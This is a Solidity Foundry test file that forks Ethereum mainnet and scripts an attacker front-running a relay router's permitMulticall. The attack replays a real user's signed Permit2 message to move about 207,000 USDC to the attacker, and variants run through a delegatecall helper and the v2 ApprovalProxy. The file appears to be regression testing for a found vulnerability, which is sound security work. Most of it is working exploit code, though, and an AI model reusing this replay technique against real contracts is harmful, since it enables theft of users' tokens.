// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2-relay/src/interfaces/IPermit2.sol";
import {ERC20Router} from "../src/v1/ERC20RouterV1.sol";
import {RelayRouter} from "../src/v2/RelayRouter.sol";
import {ApprovalProxy} from "../src/v2/ApprovalProxy.sol";
import {Call3Value} from "../src/v2/utils/RelayStructs.sol";
import {BaseRelayTest} from "./base/BaseRelayTest.sol";

import {ISignatureTransfer} from "permit2-relay/src/interfaces/ISignatureTransfer.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20Router {
    function permitMulticall(
        address user,
        ISignatureTransfer.PermitBatchTransferFrom memory permit,
        address[] calldata targets,
        bytes[] calldata datas,
        uint256[] calldata values,
        address refundTo,
        bytes memory permitSignature
    ) external payable returns (bytes[] memory);
}

contract Permit2 is Test, BaseRelayTest {

    error InvalidTarget(address target);

    address router = 0xeeeeee9eC4769A09a76A83C7bC42b185872860eE;
    address permit2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;
    address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    string public constant _RELAYER_WITNESS_TYPE_STRING = "RelayerWitness witness)RelayerWitness(address relayer)TokenPermissions(address token,uint256 amount)";
    bytes32 public constant _EIP_712_RELAYER_WITNESS_TYPE_HASH =
        keccak256(
            "RelayerWitness(address relayer,address refundTo,address nftRecipient,Call3Value[] call3Values)Call3Value(address target,bool allowFailure,uint256 value,bytes callData)"
        );
    bytes32 public constant _CALL3VALUE_TYPEHASH =
        keccak256(
            "Call3Value(address target,bool allowFailure,uint256 value,bytes callData)"
        );
    bytes32 public constant _FULL_RELAYER_WITNESS_BATCH_TYPEHASH =
        keccak256(
            "PermitBatchWitnessTransferFrom(TokenPermissions[] permitted,address spender,uint256 nonce,uint256 deadline,RelayerWitness witness)RelayerWitness(address relayer,address refundTo,address nftRecipient,Call3Value[] call3Values)Call3Value(address target,bool allowFailure,uint256 value,bytes callData)TokenPermissions(address token,uint256 amount)"
        );
    bytes32 public DOMAIN_SEPARATOR;
    address targetUser;
    bytes32 witness;
    bytes permitSignature;
    uint256 nonce;
    uint256 deadline;
    uint256 amount;
    address attacker;

    ERC20Router erc20Router;
    RelayRouter relayRouter;
    ApprovalProxy approvalProxy;

    function setUp() public override {
        super.setUp();
        targetUser = 0xf70da97812CB96acDF810712Aa562db8dfA3dbEF;
        witness = 0x9188754b7e7c994c372c19d5e2c80fc39b00ab562e99b379d948bf7b1e8b94c1;
        permitSignature = hex"d4215350b9d1593dd2d5c0ed34d7242a05e3723c38d7517253c04d083be9877d443cea0198e18059116ff2322c4b0abbcd9a43a4f569acb206568a1a3c9ac9a51b";
        nonce = 95289913598757;
        deadline = 1748611956;
        amount = 207105292484; // 207,105 USDC (6 decimals)

        vm.createSelectFork(vm.rpcUrl("mainnet"), 22382180);
        DOMAIN_SEPARATOR = IPermit2(permit2).DOMAIN_SEPARATOR();

        erc20Router = new ERC20Router(permit2);
        vm.etch(router, address(erc20Router).code);

        relayRouter = new RelayRouter();
        approvalProxy = new ApprovalProxy(address(this), address(relayRouter), permit2);

        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
    }

    function testFrontrunPermitMulticall__v1() public {
        vm.startPrank(attacker);

        ISignatureTransfer.TokenPermissions[] memory permitted = new ISignatureTransfer.TokenPermissions[](1);
        permitted[0] = ISignatureTransfer.TokenPermissions({ token: usdc, amount: amount });

        ISignatureTransfer.PermitBatchTransferFrom memory permit = ISignatureTransfer.PermitBatchTransferFrom({
            permitted: permitted,
            nonce: nonce,
            deadline: deadline
        });

        ISignatureTransfer.SignatureTransferDetails[] memory signatureTransferDetails = new ISignatureTransfer.SignatureTransferDetails[](1);
        signatureTransferDetails[0] = ISignatureTransfer.SignatureTransferDetails({
            to: router,
            requestedAmount: amount
        });

        address[] memory targets = new address[](2);
        targets[0] = permit2;
        targets[1] = usdc;

        bytes[] memory datas = new bytes[](2);
        datas[0] = abi.encodeWithSelector(
            0xfe8ec1a7, // selector of permit2.permitWitnessTransferFrom
            permit,
            signatureTransferDetails,
            targetUser,
            witness,
            _RELAYER_WITNESS_TYPE_STRING,
            permitSignature
        );
        datas[1] = abi.encodeWithSignature(
            "transfer(address,uint256)",
            attacker,
            amount
        );

        uint256[] memory values = new uint256[](2);

        vm.expectRevert(abi.encodeWithSelector(InvalidTarget.selector, permit2));
        IERC20Router(router).permitMulticall(
            attacker,
            permit,
            targets,
            datas,
            values,
            address(0),
            bytes("") // empty permitSignature to skip _handlePermitBatch
        );

        vm.stopPrank();
        console.log("attacker USDC balance: %s", IERC20(usdc).balanceOf(attacker));
    }

    function testFrontrunDelegatecallPermitMulticall__v1() public {
        vm.startPrank(attacker);

        DelegatecallPermit2 delegatecallPermit2 = new DelegatecallPermit2(permit2);
        
        ISignatureTransfer.TokenPermissions[] memory permitted = new ISignatureTransfer.TokenPermissions[](1);
        permitted[0] = ISignatureTransfer.TokenPermissions({ token: usdc, amount: amount });

        ISignatureTransfer.PermitBatchTransferFrom memory permit = ISignatureTransfer.PermitBatchTransferFrom({
            permitted: permitted,
            nonce: nonce,
            deadline: deadline
        });

        ISignatureTransfer.SignatureTransferDetails[] memory signatureTransferDetails = new ISignatureTransfer.SignatureTransferDetails[](1);
        signatureTransferDetails[0] = ISignatureTransfer.SignatureTransferDetails({
            to: router,
            requestedAmount: amount
        });

        address[] memory targets = new address[](2);
        targets[0] = address(delegatecallPermit2);
        targets[1] = usdc;

        bytes[] memory datas = new bytes[](2);
        datas[0] = abi.encodeWithSelector(
            0xfe8ec1a7, // selector of permit2.permitWitnessTransferFrom
            permit,
            signatureTransferDetails,
            targetUser,
            witness,
            _RELAYER_WITNESS_TYPE_STRING,
            permitSignature
        );
        datas[1] = abi.encodeWithSignature(
            "transfer(address,uint256)",
            attacker,
            amount
        );

        uint256[] memory values = new uint256[](2);
        
        vm.expectRevert();
        IERC20Router(router).permitMulticall(
            attacker,
            permit,
            targets,
            datas,
            values,
            address(0),
            bytes("") // empty permitSignature to skip _handlePermitBatch
        );

        vm.stopPrank();
        
        console.log("attacker USDC balance: %s", IERC20(usdc).balanceOf(attacker));
        assertEq(IERC20(usdc).balanceOf(attacker), 0);
    }

    function testFrontrunPermitMulticall__v2() public {
        // Create the permit
        ISignatureTransfer.TokenPermissions[]
            memory permitted = new ISignatureTransfer.TokenPermissions[](1);
        permitted[0] = ISignatureTransfer.TokenPermissions({
            token: address(erc20_1),
            amount: 1 ether
        });

        ISignatureTransfer.PermitBatchTransferFrom
            memory permit = ISignatureTransfer.PermitBatchTransferFrom({
                permitted: permitted,
                nonce: 1,
                deadline: block.timestamp + 100
            });
        ISignatureTransfer.SignatureTransferDetails[] memory signatureTransferDetails = new ISignatureTransfer.SignatureTransferDetails[](1);
        signatureTransferDetails[0] = ISignatureTransfer.SignatureTransferDetails({
            to: address(relayRouter),
            requestedAmount: 1 ether
        });

        // Create calldata to transfer tokens from the router to attacker
        bytes memory calldata1 = abi.encodeWithSelector(
            erc20_1.transfer.selector,
            attacker,
            1 ether
        );

        Call3Value[] memory calls = new Call3Value[](1);
        calls[0] = Call3Value({
            target: address(erc20_1),
            allowFailure: false,
            value: 0,
            callData: calldata1
        });

        // Get the witness
        bytes32[] memory call3ValuesHashes = new bytes32[](calls.length);
        for (uint256 i = 0; i < calls.length; i++) {
            call3ValuesHashes[i] = keccak256(
                abi.encode(
                    _CALL3VALUE_TYPEHASH,
                    calls[i].target,
                    calls[i].allowFailure,
                    calls[i].value,
                    keccak256(calls[i].callData)
                )
            );
        }

        bytes32 v2Witness = keccak256(
            abi.encode(
                _EIP_712_RELAYER_WITNESS_TYPE_HASH,
                relayer.addr,
                alice.addr,
                address(0),
                keccak256(abi.encodePacked(call3ValuesHashes))
            )
        );

        // Get the permit signature
        bytes memory permitSig = getPermitBatchWitnessSignature(
            permit,
            address(approvalProxy),
            alice.key,
            _FULL_RELAYER_WITNESS_BATCH_TYPEHASH,
            witness,
            DOMAIN_SEPARATOR
        );

        bytes memory attackerCalldata1 = abi.encodeWithSelector(
            0xfe8ec1a7, // selector of permit2.permitWitnessTransferFrom
            permit,
            signatureTransferDetails,
            targetUser,
            witness,
            _RELAYER_WITNESS_TYPE_STRING,
            permitSignature
        );
        bytes memory attackerCalldata2 = abi.encodeWithSignature(
            "transfer(address,uint256)",
            attacker,
            1 ether
        );

        Call3Value[] memory attackerCalls = new Call3Value[](2);
        attackerCalls[0] = Call3Value({
            target: permit2,
            allowFailure: false,
            value: 0,
            callData: attackerCalldata1
        });

        attackerCalls[1] = Call3Value({
            target: address(erc20_1),
            allowFailure: false,
            value: 0,
            callData: attackerCalldata2
        });

        // Attacker frontruns the permit multicall
        vm.prank(attacker);
        approvalProxy.permit2TransferAndMulticall(
            attacker,
            permit,
            attackerCalls,
            attacker,
            address(0),
            bytes("")
        );

        console.log("attacker ERC20 balance: %s", IERC20(address(erc20_1)).balanceOf(attacker));
    }
}

contract DelegatecallPermit2 {
    address permit2;

    constructor(address _permit2) {
        permit2 = _permit2;
    }

    fallback() external {
        (bool success, bytes memory data) = permit2.delegatecall(msg.data);
    }
}